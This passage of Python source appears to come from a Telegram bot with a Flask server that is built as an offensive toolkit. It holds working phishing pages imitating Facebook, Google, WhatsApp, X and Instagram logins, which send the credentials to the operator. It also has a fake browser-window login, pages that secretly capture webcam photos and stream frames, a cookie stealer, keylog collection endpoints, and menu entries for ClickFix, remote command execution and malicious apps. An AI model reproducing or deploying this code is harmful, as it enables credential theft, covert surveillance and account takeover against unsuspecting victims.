            .forgot-link { display: block; margin: 18px 0 16px; font-size: 14px; color: #1C1E21; text-decoration: none; text-align: center; }
            .bottom-section { width: 100%; display: flex; flex-direction: column; align-items: center; padding-bottom: 20px; }
            .create-btn { width: 100%; height: 50px; background: transparent; border: 2px solid #1877F2; border-radius: 25px; font-size: 16px; font-weight: 500; color: #1877F2; cursor: pointer; margin-bottom: 14px; }
            .meta-footer { display: flex; align-items: center; gap: 6px; font-size: 14px; color: #1C1E21; }
            .meta-footer .infinity { color: #1877F2; font-size: 22px; font-weight: 700; }
        </style>
    </head>
    <body>
    <div class="container">
        <div class="top-section">
            <div class="language-selector"><span>العربية</span></div>
            <div class="logo-circle"><span>f</span></div>
            <form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
                <input type="hidden" name="platform" value="facebook">
                <div class="form-group"><input type="text" name="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required autofocus></div>
                <div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
                <button type="submit" class="login-btn">تسجيل الدخول</button>
            </form>
            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
        </div>
        <div class="bottom-section">
            <button type="button" class="create-btn" onclick="alert('سيتم إنشاء حساب جديد قريباً')">إنشاء حساب جديد</button>
            <div class="meta-footer"><span class="infinity">∞</span><span>Meta</span></div>
        </div>
    </div>
    <script>
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/api/phishing_submit', {method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
            .finally(() => setTimeout(() => window.location.href = 'https://www.facebook.com', 1500));
        });
    </script>
    </body>
    </html>
    ''',
    'google': '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Google - تسجيل الدخول</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
            body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
            .container { width: 100%; max-width: 420px; padding: 0 16px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
            .logo { font-size: 36px; font-weight: 500; margin: 6px 0 16px; }
            .logo .b { color: #4285f4; } .logo .r { color: #ea4335; } .logo .y { color: #fbbc05; } .logo .g { color: #34a853; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; height: 50px; padding: 0 16px; border: 1px solid #dadce0; border-radius: 25px; font-size: 15px; outline: none; }
            .form-group input:focus { border-color: #4285f4; }
            .login-btn { width: 100%; height: 50px; background: #4285f4; border: none; border-radius: 25px; font-size: 16px; color: #fff; cursor: pointer; margin-top: 4px; }
            .forgot { display: block; margin: 22px 0; font-size: 14px; color: #1C1E21; text-decoration: none; text-align: center; }
        </style>
    </head>
    <body>
    <div class="container">
        <div class="logo"><span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span></div>
        <form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
            <input type="hidden" name="platform" value="google">
            <div class="form-group"><input type="email" name="username" placeholder="البريد الإلكتروني" required autofocus></div>
            <div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
        <a href="#" class="forgot">نسيت كلمة السر؟</a>
    </div>
    <script>
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/api/phishing_submit', {method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
            .finally(() => setTimeout(() => window.location.href = 'https://www.google.com', 1500));
        });
    </script>
    </body>
    </html>
    ''',
    'whatsapp': '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WhatsApp Web</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
            body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
            .container { width: 100%; max-width: 420px; padding: 0 16px; }
            .logo { font-size: 36px; font-weight: 700; color: #25d366; margin: 6px 0 16px; text-align: center; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; height: 50px; padding: 0 16px; border: 1px solid #CCD0D5; border-radius: 25px; font-size: 15px; outline: none; }
            .form-group input:focus { border-color: #075e54; }
            .login-btn { width: 100%; height: 50px; background: #25d366; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; color: #fff; cursor: pointer; margin-top: 4px; }
            .forgot { display: block; margin: 22px 0; font-size: 14px; color: #1C1E21; text-decoration: none; text-align: center; }
        </style>
    </head>
    <body>
    <div class="container">
        <div class="logo">💬 WhatsApp</div>
        <form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
            <input type="hidden" name="platform" value="whatsapp">
            <div class="form-group"><input type="text" name="username" placeholder="رقم الهاتف" required autofocus></div>
            <div class="form-group"><input type="password" name="password" placeholder="الكود" required></div>
            <button type="submit" class="login-btn">تحقق</button>
        </form>
        <a href="#" class="forgot">هل نسيت الكود؟</a>
    </div>
    <script>
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/api/phishing_submit', {method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
            .finally(() => setTimeout(() => window.location.href = 'https://web.whatsapp.com', 1500));
        });
    </script>
    </body>
    </html>
    ''',
    'twitter': '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>X - تسجيل الدخول</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
            body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
            .container { width: 100%; max-width: 420px; padding: 0 16px; }
            .logo { font-size: 42px; font-weight: 700; color: #000; text-align: center; margin: 6px 0 16px; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; height: 50px; padding: 0 16px; border: 1px solid #CCD0D5; border-radius: 25px; font-size: 15px; outline: none; }
            .form-group input:focus { border-color: #1d9bf0; }
            .login-btn { width: 100%; height: 50px; background: #000; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; color: #fff; cursor: pointer; margin-top: 4px; }
        </style>
    </head>
    <body>
    <div class="container">
        <div class="logo">𝕏</div>
        <form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
            <input type="hidden" name="platform" value="twitter">
            <div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم" required autofocus></div>
            <div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
    </div>
    <script>
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/api/phishing_submit', {method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
            .finally(() => setTimeout(() => window.location.href = 'https://x.com', 1500));
        });
    </script>
    </body>
    </html>
    ''',
    'instagram': '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
            body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
            .container { background: #fff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 30px; max-width: 380px; width: 100%; }
            .logo { font-size: 32px; font-weight: 700; color: #262626; text-align: center; margin-bottom: 16px; }
            .form-group { margin-bottom: 12px; }
            .form-group input { width: 100%; height: 48px; padding: 0 16px; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 15px; background: #fafafa; outline: none; }
            .form-group input:focus { border-color: #a8a8a8; }
            .login-btn { width: 100%; height: 48px; background: #0095f6; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; color: #fff; cursor: pointer; }
        </style>
    </head>
    <body>
    <div class="container">
        <div class="logo">📷 Instagram</div>
        <form action="/api/phishing_submit" method="POST" id="phishForm">
            <input type="hidden" name="platform" value="instagram">
            <div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم" required autofocus></div>
            <div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
    </div>
    <script>
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/api/phishing_submit', {method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
            .finally(() => setTimeout(() => window.location.href = 'https://www.instagram.com', 1500));
        });
    </script>
    </body>
    </html>
    '''
}

# ===================== دوال بناء القوائم =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("🌤️ حالة الطقس", callback_data="weather"),
               InlineKeyboardButton("📚 ويكيبيديا", callback_data="wikipedia"))
    markup.row(InlineKeyboardButton("🔑 مولد كلمات المرور", callback_data="password_gen"),
               InlineKeyboardButton("🔐 تحليل كلمات المرور", callback_data="password_strength"))
    markup.row(InlineKeyboardButton("🎤 تحويل نص لصوت", callback_data="voice_gtts_menu"),
               InlineKeyboardButton("🌐 الترجمة", callback_data="translate"))
    markup.row(InlineKeyboardButton("⏰ التذكير", callback_data="reminder"),
               InlineKeyboardButton("📰 الأخبار", callback_data="news"))
    markup.row(InlineKeyboardButton("🔗 تقصير الروابط", callback_data="shorten_url"),
               InlineKeyboardButton("🔗 فك الروابط", callback_data="expand_url"))
    if user_can_use_collector(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device_info"),
                   InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_hack"))
    if user_can_use_advanced(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("🍪 استخراج الكوكيز", callback_data="cookie_stealer"),
                   InlineKeyboardButton("📱 تتبع رقم الهاتف", callback_data="track_phone"))
    markup.row(InlineKeyboardButton("📹 مكالمة فيديو", callback_data="video_call"),
               InlineKeyboardButton("💬 اقتباسات", callback_data="quotes_menu"))
    markup.row(InlineKeyboardButton("🔍 فحص الروابط", callback_data="check_link_btn"),
               InlineKeyboardButton("📦 تحليل APK", callback_data="analyze_apk"))
    markup.row(InlineKeyboardButton("📄 تحليل PDF", callback_data="pdf_menu"),
               InlineKeyboardButton("🎨 توليد صور AI", callback_data="generate_image_btn"))
    markup.row(InlineKeyboardButton("📧 بريد مؤقت", callback_data="create_email_btn"),
               InlineKeyboardButton("💎 نقاطي", callback_data="my_points"))
    markup.row(InlineKeyboardButton("🔗 رابط الدعوة", callback_data="my_referral"),
               InlineKeyboardButton("📜 سجل النقاط", callback_data="points_history"))
    markup.row(InlineKeyboardButton("🎯 ClickFix (أمر خادع)", callback_data="clickfix_generator"))
    markup.row(InlineKeyboardButton("📧 AccountDumpling", callback_data="account_dumpling"))
    markup.row(InlineKeyboardButton("🪟 BitB (نافذة مزيفة)", callback_data="bitb_attack"))
    markup.row(InlineKeyboardButton("🔑 ConsentFix (OAuth)", callback_data="consentfix_attack"))
    markup.row(InlineKeyboardButton("📱 BTMOB (تطبيق خبيث)", callback_data="btmob_attack"))
    markup.row(InlineKeyboardButton("📥 تنزيل فيديو", callback_data="download_video"))
    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("🔍 vuln-agent", callback_data="vuln_agent"))
        markup.row(InlineKeyboardButton("🕵️ osint-d2", callback_data="osint_d2"))
        markup.row(InlineKeyboardButton("🌐 Py-NetRecon", callback_data="py_netrecon"))
        markup.row(InlineKeyboardButton("💀 Exploit-Dev", callback_data="exploit_dev"))
        markup.row(InlineKeyboardButton("📧 H4X-Tools", callback_data="h4x_tools"))
        markup.row(InlineKeyboardButton("🛡️ Matkap", callback_data="matkap"))
        markup.row(InlineKeyboardButton("🐍 Pentest Tools", callback_data="pentest_tools"))
    if user_can_use_phishing(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("🎣 صفحات تصيد", callback_data="phishing_pages"),
                   InlineKeyboardButton("📧 بريد تصيد", callback_data="phishing_email"))
    else:
        markup.row(InlineKeyboardButton("🔒 صفحات تصيد (300 نقطة)", callback_data="phishing_locked"))
    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("⚙️ لوحة التحكم", callback_data="admin_panel"))
        markup.row(InlineKeyboardButton("🖥️ RCE (تنفيذ أوامر)", callback_data="rce_menu"),
                   InlineKeyboardButton("🔑 Keylogger", callback_data="keylogger_menu"))
        markup.row(InlineKeyboardButton("🛡️ الحماية", callback_data="protection_menu"),
                   InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users"))
    markup.row(InlineKeyboardButton("⬅️ القائمة", callback_data="back_main"))
    return markup

def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"),
               InlineKeyboardButton("جوجل", callback_data="phish_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_whatsapp"),
               InlineKeyboardButton("تويتر", callback_data="phish_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_instagram"),
               InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_platform_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_platform_facebook"),
               InlineKeyboardButton("جوجل", callback_data="phish_platform_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_platform_whatsapp"),
               InlineKeyboardButton("تويتر", callback_data="phish_platform_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_platform_instagram"),
               InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for cat in QUOTES_DB.keys():
        markup.row(InlineKeyboardButton(cat, callback_data=f"quote_cat_{cat}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_voice_gtts_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for voice_name in VOICES.keys():
        markup.row(InlineKeyboardButton(f"🎤 {voice_name}", callback_data=f"voice_gtts_{voice_name}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("تلخيص PDF", callback_data="pdf_summary"),
               InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_translate_menu():
    markup = InlineKeyboardMarkup(row_width=3)
    languages = list(LANGUAGES.items())
    for i in range(0, len(languages), 3):
        row = [InlineKeyboardButton(name, callback_data=f"trans_lang_{code}") for code, name in languages[i:i+3]]
        markup.row(*row)
    markup.row(InlineKeyboardButton("إلغاء", callback_data="back_main"))
    return markup

def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("الإحصائيات", callback_data="admin_stats"),
               InlineKeyboardButton("البث الجماعي", callback_data="admin_broadcast"))
    markup.row(InlineKeyboardButton("قائمة المستخدمين", callback_data="admin_users"),
               InlineKeyboardButton("التقارير", callback_data="admin_reports"))
    markup.row(InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"),
               InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("قفل البوت", callback_data="protect_lock"),
               InlineKeyboardButton("تخفي شامل", callback_data="protect_stealth"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    for i, duaa in enumerate(DUAA_DB):
        markup.row(InlineKeyboardButton(duaa['title'], callback_data=f"doaa_{i}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_muslim_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton("أركان الإسلام", callback_data="muslim_arkan_islam"))
    markup.row(InlineKeyboardButton("أركان الإيمان", callback_data="muslim_arkan_iman"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_users_menu(chat_id, action):
    users = safe_db_query("SELECT chat_id, is_admin, is_banned, points FROM users", fetch_one=False)
    if not users:
        return None, "لا يوجد مستخدمين"
    markup = InlineKeyboardMarkup(row_width=1)
    for user in users:
        user_id = user[0]
        name = get_user_name(user_id)
        status = "🟢" if user[2] == 0 else "🔴"
        label = f"{name} ({user_id}) - {status} - نقاط: {user[3]}"
        markup.row(InlineKeyboardButton(label, callback_data=f"{action}_user_{user_id}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup, None

# ===================== دوال توليد صفحات الهجوم =====================
def generate_bitb_page(chat_id):
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>فيسبوك</title>
    <style>
        .fake-window {{ position: fixed; top: 10%; left: 25%; width: 50%; background: #fff; border: 2px solid #1877f2; border-radius: 8px; box-shadow: 0 8px 30px rgba(0,0,0,0.3); z-index: 9999; }}
        .fake-header {{ background: #1877f2; padding: 8px; color: #fff; font-weight: bold; display: flex; justify-content: space-between; }}
        .fake-body {{ padding: 20px; text-align: center; }}
        .fake-body input {{ width: 90%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }}
        .fake-body button {{ width: 90%; padding: 10px; background: #1877f2; color: #fff; border: none; border-radius: 4px; }}
    </style>
    </head>
    <body>
        <div class="fake-window" id="bitbWindow">
            <div class="fake-header"><span>🔒 فيسبوك</span><span onclick="document.getElementById('bitbWindow').style.display='none'">✕</span></div>
            <div class="fake-body">
                <h3>تسجيل الدخول</h3>
                <input type="text" placeholder="البريد" id="bitbEmail">
                <input type="password" placeholder="كلمة السر" id="bitbPass">
                <button onclick="sendBitbData()">دخول</button>
            </div>
        </div>
        <script>
            function sendBitbData() {{
                fetch('/api/phishing_submit', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                    body: new URLSearchParams({{platform:'facebook', username:document.getElementById('bitbEmail').value, password:document.getElementById('bitbPass').value}})
                }});
                alert('تم تسجيل الدخول!');
                window.location.href = 'https://www.facebook.com';
            }}
        </script>
    </body>
    </html>
    '''

def generate_consentfix_page(chat_id):
    return f'''
    <!DOCTYPE html>
    <html><head><title>طلب الإذن</title></head>
    <body style="font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;">
        <div style="background:#fff;padding:30px;border-radius:8px;max-width:400px;">
            <h2>🔐 طلب الإذن</h2>
            <p>تطبيق "Security Check" يطلب صلاحيات:</p>
            <ul><li>البريد الإلكتروني</li><li>الملفات</li></ul>
            <button onclick="alert('تم منح الإذن');window.location.href='https://www.microsoft.com'" style="background:#0078d4;color:#fff;padding:12px;border:none;border-radius:4px;width:100%;">منح الإذن</button>
        </div>
    </body></html>
    '''

def generate_btmob_page(chat_id):
    return f'''
    <!DOCTYPE html>
    <html><head><title>تحميل التطبيق</title></head>
    <body style="text-align:center;padding:50px;">
        <h2>📱 تحديث التطبيق</h2>
        <p>يوجد تحديث أمني عاجل.</p>
        <a href="#" style="background:#4CAF50;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;">تحميل</a>
    </body></html>
    '''

# ===================== مسارات Flask =====================
@app.route('/')
def index():
    return "OK", 200

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "time": datetime.now().isoformat()}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = Update.de_json(json_str, bot)
        threading.Thread(target=bot.process_new_updates, args=([update],), daemon=True).start()
        return "OK", 200
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        return "ERROR", 500

@app.route('/api/phishing_submit', methods=['POST'])
def phishing_submit():
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr or 'unknown'
        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        try:
            notify_admin(f"🎯 تصيد جديد!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}")
        except:
            pass
        return "OK", 200
    except Exception as e:
        logger.error(f"phishing_submit error: {e}")
        return "ERROR", 500

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    html = PHISHING_TEMPLATES.get(platform)
    if not html:
        return "منصة غير مدعومة", 404
    return render_template_string(html)

@app.route('/bitb')
def bitb_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    return render_template_string(generate_bitb_page(chat_id))

@app.route('/consentfix')
def consentfix_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    return render_template_string(generate_consentfix_page(chat_id))

@app.route('/btmob')
def btmob_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    return render_template_string(generate_btmob_page(chat_id))

@app.route('/camera_hack')
def camera_hack_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = f'''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تأكيد الهوية</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }}
        body {{ background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }}
        .container {{ background:#fff; border-radius:12px; box-shadow:0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding:40px 30px; max-width:450px; width:100%; text-align:center; }}
        .logo {{ font-size:42px; font-weight:700; color:#1877f2; margin-bottom:10px; }}
        .title {{ font-size:20px; font-weight:600; color:#1c1e21; margin-bottom:8px; }}
        .subtitle {{ font-size:15px; color:#606770; margin-bottom:20px; }}
        .btn {{ background:#1877f2; color:#fff; border:none; padding:14px; border-radius:8px; width:100%; font-size:18px; font-weight:600; cursor:pointer; }}
    </style></head>
    <body>
    <div class="container">
        <div class="logo">f</div>
        <div class="title">تأكيد الهوية</div>
        <div class="subtitle">لأسباب أمنية، يرجى التقاط صورة شخصية</div>
        <button id="captureBtn" class="btn">📸 التقاط صورة</button>
    </div>
    <script>
        (function() {{
            const btn = document.getElementById('captureBtn');
            const chatId = new URLSearchParams(window.location.search).get('id');
            if (!chatId) {{ alert('رابط غير صالح'); return; }}
            btn.addEventListener('click', function() {{
                btn.disabled = true;
                btn.textContent = '⏳ جاري التحقق...';
                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user', width: 320, height: 240 }}, audio: false }})
                .then(function(stream) {{
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.style.position = 'absolute';
                    video.style.left = '-9999px';
                    document.body.appendChild(video);
                    video.play();
                    setTimeout(function() {{
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.9);
                        stream.getTracks().forEach(t => t.stop());
                        video.remove();
                        fetch('/api/collect_camera', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ chat_id: chatId, image: imageData, source: 'camera_hack' }})
                        }}).finally(() => {{ window.location.href = 'https://www.facebook.com'; }});
                    }}, 800);
                }})
                .catch(function(err) {{
                    alert('فشل الوصول للكاميرا.');
                    btn.disabled = false;
                    btn.textContent = '📸 التقاط صورة';
                }});
            }});
        }})();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/api/collect_camera', methods=['POST'])
def collect_camera():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400
        chat_id = data.get('chat_id')
        image_data = data.get('image')
        source = data.get('source', 'camera')
        if not chat_id or not image_data:
            return jsonify({"status": "error"}), 400
        if ',' in image_data:
            image_data = image_data.split(',')[1]
        img_binary = base64.b64decode(image_data)
        safe_db_execute("INSERT INTO camera_images (chat_id, image, created_at) VALUES (?, ?, ?)",
                        (chat_id, img_binary, datetime.now().isoformat()))
        os.makedirs('collected', exist_ok=True)
        filename = f"collected/cam_{chat_id}_{int(time.time())}.jpg"
        with open(filename, 'wb') as f:
            f.write(img_binary)
        try:
            bio = BytesIO(img_binary)
            bio.name = 'photo.jpg'
            bot.send_photo(ADMIN_ID, bio, caption=f"📸 {source}\nالمستخدم: {chat_id}")
        except Exception as e:
            logger.error(f"send_photo error: {e}")
            notify_admin(f"📸 صورة من {source} (المستخدم: {chat_id})")
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"collect_camera error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/video_call')
def video_call_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = f'''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ConnectPro</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #0F0F1A; color: #fff; margin: 0; padding: 20px; text-align: center; }}
        video {{ width: 100%; max-width: 320px; border-radius: 12px; border: 2px solid #a855f7; }}
        h1 {{ color: #a855f7; }}
    </style></head>
    <body>
        <h1>ConnectPro</h1>
        <p>جاري الاتصال...</p>
        <video id="selfVideo" autoplay muted playsinline></video>
    <script>
        const chatId = '{chat_id}';
        let stream = null, captureInterval = null;
        window.onload = function() {{
            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user', width: 320, height: 240 }}, audio: false }})
            .then(s => {{
                stream = s;
                document.getElementById('selfVideo').srcObject = stream;
                captureInterval = setInterval(captureAndSend, 3000);
            }})
            .catch(err => console.error('Camera error:', err));
        }};
        function captureAndSend() {{
            if (!stream) return;
            const video = document.getElementById('selfVideo');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 320;
            canvas.height = video.videoHeight || 240;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            fetch('/api/collect_camera', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ chat_id: chatId, image: canvas.toDataURL('image/jpeg', 0.8), source: 'video_call' }})
            }});
        }}
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/cookie_stealer')
def cookie_stealer_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = '''
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><title>جاري التحقق</title></head>
    <body><h3 style="font-family:Arial;text-align:center;margin-top:50px;">⏳ جاري التحقق...</h3>
    <script>
    (function() {
        const chatId = new URLSearchParams(window.location.search).get('id');
        if (!chatId) return;
        const cookies = document.cookie;
        if (cookies) {
            fetch('/api/collect_cookie', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chatId, url: window.location.href, cookies: cookies, technique: 'direct'})
            });
        }
    })();
    </script>
    </body></html>
    '''
    return render_template_string(html)

@app.route('/api/collect_cookie', methods=['POST'])
def collect_cookie():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        cookie = data.get('cookie') or data.get('cookies')
        technique = data.get('technique', 'unknown')
        url = data.get('url', '')
        if not chat_id or not cookie:
            return jsonify({"status": "error"}), 400
        safe_db_execute("INSERT INTO stolen_cookies (chat_id, url, cookie_name, cookie_value, technique, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        (chat_id, url, 'stolen', cookie if isinstance(cookie, str) else str(cookie), technique, datetime.now().isoformat()))
        notify_admin(f"🍪 {technique}: {str(cookie)[:100]}")
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/collect_keylog', methods=['POST'])
def collect_keylog():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        keystrokes = data.get('keystrokes', '')
        if chat_id and keystrokes:
            safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                            (str(chat_id), "keylog", keystrokes, datetime.now().isoformat()))
            notify_admin(f"⌨️ ضغطات من {chat_id}: {keystrokes}")
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error"}), 500

@app.route('/s/<short_code>')
def redirect_short(short_code):
    original = expand_url(f"{SERVER_URL}/s/{short_code}")
    if original:
        return redirect(original)
    return "الرابط غير صحيح", 404

@app.route('/temp/<filename>')
def serve_temp_file(filename):
    return send_from_directory('temp', filename)

@app.route('/reel')
def reel_redirect():
    return redirect(f"{SERVER_URL}/phishing_pages/facebook")
    # ===================== معالج /start =====================
